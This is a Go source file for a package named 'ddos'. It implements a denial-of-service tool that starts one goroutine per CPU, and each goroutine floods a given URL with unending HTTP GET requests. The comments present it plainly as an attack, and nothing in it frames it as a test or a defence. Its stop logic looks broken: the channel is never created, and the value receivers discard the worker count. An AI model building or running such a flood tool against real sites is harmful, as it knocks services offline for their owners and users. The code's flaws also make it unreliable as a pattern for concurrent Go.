package ddos

import (
	"io"
	"io/ioutil"
	"net/http"
	"runtime"
)

// DDoS - structure of value for DDoS attack
type DDoS struct {
	url           string
	stop          chan bool
	amountWorkers int
}

// NewDDoS - initialization of new DDoS attack
func NewDDoS(url string) *DDoS {
	return &DDoS{
		url: url,
	}
}

// Run - run DDoS attack
func (d DDoS) Run() {
	d.amountWorkers = runtime.GOMAXPROCS(-1)
	for i := 0; i < d.amountWorkers; i++ {
		go func() {
			for {
				select {
				case <-d.stop:
					return
				default:
					// sent http GET requests
					resp, _ := http.Get(d.url)
					if resp != nil {
						_, _ = io.Copy(ioutil.Discard, resp.Body)
						_ = resp.Body.Close()
					}
				}
			}
		}()
	}
}

// Stop - stop DDoS attack
func (d DDoS) Stop() {
	for i := 0; i < d.amountWorkers; i++ {
		d.stop <- true
	}
}
